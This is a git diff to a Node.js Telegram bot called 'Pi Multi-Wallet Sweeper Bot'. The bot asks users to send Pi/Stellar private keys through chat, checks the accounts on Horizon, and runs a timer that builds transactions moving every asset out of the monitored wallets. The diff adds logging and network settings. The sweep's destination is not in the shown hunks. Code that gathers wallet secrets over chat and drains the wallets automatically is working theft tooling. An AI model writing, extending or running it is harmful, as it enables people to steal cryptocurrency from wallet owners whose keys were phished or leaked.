@@ -21,6 +21,9 @@ const bot = new TelegramBot(token, { polling: true });
 // Initialize Stellar Server (Pi Network runs on Stellar-based architecture)
 const server = new StellarSdk.Horizon.Server('https://horizon.pi-network.network');
 
+// Network passphrase definition (Ensure this matches Pi's network ID if custom)
+const PI_NETWORK_PASSPHRASE = StellarSdk.Networks.PUBLIC; 
+
 // In-memory registry tracking monitored wallets
 let activeMonitors = [];
 
@@ -35,20 +38,30 @@ bot.onText(/\/start/, (msg) => {
     bot.sendMessage(chatId, 
         `⚡ *Pi Multi-Wallet Sweeper Bot Online*\n\n` +
         `Send your passphrases or keys to monitor them.\n` +
-        `• Format: \`/add <your_passphrase_here>\`\n` +
+        `• Format: \`/add <your_private_key_or_secret>\`\n` +
         `• Check status: \`/status\``, 
         { parse_mode: "Markdown" }
     );
 });
 
-// Command: /add <passphrase>
-bot.onText(/\/add (.+)/, (msg, match) => {
+// Command: /add <passphrase or private key> with built-in validation & lookup
+bot.onText(/\/add (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const passphraseOrKey = match[1].trim();
 
     try {
         const keypair = StellarSdk.Keypair.fromSecret(passphraseOrKey);
         const publicKey = keypair.publicKey();
+
+        console.log(`🔑 Derived Public Key for input: ${publicKey}`);
+
+        // Verify account on Horizon immediately upon adding
+        try {
+            const accountInfo = await server.loadAccount(publicKey);
+            console.log(`✅ Account verified on Horizon! Balances found count:`, accountInfo.balances.length);
+        } catch (horizonErr) {
+            console.log(`⚠️ Horizon warning for ${publicKey}: ${horizonErr.message}`);
+        }
 
         const exists = activeMonitors.find(w => w.publicKey === publicKey);
         if (exists) {
@@ -73,6 +86,7 @@ bot.onText(/\/add (.+)/, (msg, match) => {
         );
 
     } catch (error) {
+        console.error(`❌ Key derivation error:`, error.message);
         bot.sendMessage(chatId, `❌ Invalid passphrase or key format: ${error.message}`);
     }
 });
@@ -140,7 +154,7 @@ setInterval(async () => {
                 // Build a transaction that includes operations for every asset found
                 let transactionBuilder = new StellarSdk.TransactionBuilder(sourceAccount, {
                     fee: StellarSdk.BASE_FEE,
-                    networkPassphrase: StellarSdk.Networks.PUBLIC
+                    networkPassphrase: PI_NETWORK_PASSPHRASE
                 });
 
                 operationsToAdd.forEach(op => {
@@ -167,9 +181,12 @@ setInterval(async () => {
                 );
             }
         } catch (err) {
-            // Ignore 404 errors for unfunded accounts
-            if (!err.message || !err.message.includes('404')) {
-                console.error(`Error processing wallet #${wallet.id}:`, err.message);
+            // DETAILED ERROR LOGGING: Captures full server/network error responses for debugging
+            const errorDetails = err.response?.data ? JSON.stringify(err.response.data) : (err.message || err);
+            
+            // Suppress 404 logs for accounts that haven't been funded on-chain yet
+            if (!String(errorDetails).includes('404')) {
+                console.error(`❌ ERROR processing wallet #${wallet.id} (${wallet.publicKey}):`, errorDetails);
             }
         }
     }
